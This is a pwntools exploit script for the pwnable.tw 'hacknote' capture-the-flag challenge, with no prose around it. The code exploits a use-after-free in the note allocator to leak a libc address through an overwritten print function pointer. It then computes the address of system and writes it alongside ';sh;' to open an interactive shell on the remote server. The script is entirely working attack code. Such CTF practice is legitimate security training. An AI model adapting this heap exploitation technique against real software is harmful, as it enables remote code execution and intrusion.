from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./hacknote'],env={'LD_PRELOAD':'./libc_32.so.6'})
#r = process('./hacknote')
r = remote('chall.pwnable.tw',10102)

def addnote(size,content):
    r.sendafter(':','1\n')
    r.sendafter(':',size+'\n')
    r.sendafter(':',content+'\n')

def delnote(index):
    r.sendafter(':','2\n')
    r.sendafter(':',index+'\n')

def printnote(index):
    r.sendafter(':','3\n')
    r.sendafter(':',index+'\n')

def main():
    addnote('16','aaa')
    addnote('16','bbb')
    delnote('0')
    delnote('1')
    addnote('8',p32(0x0804862b)+p32(0x0804a004))
    printnote('0')
    leak = r.recvuntil('-')
    libc_leak = u32(leak[15:19])
    libc_base_offset = 0xd41c0
    libc_system_offset = 0x0003a940
    libc_base = libc_leak - libc_base_offset
    libc_system = libc_base + libc_system_offset
    delnote('2')
    addnote('8',p32(libc_system)+';sh;')
    printnote('0')
    r.interactive()

if __name__ == '__main__':
    main()
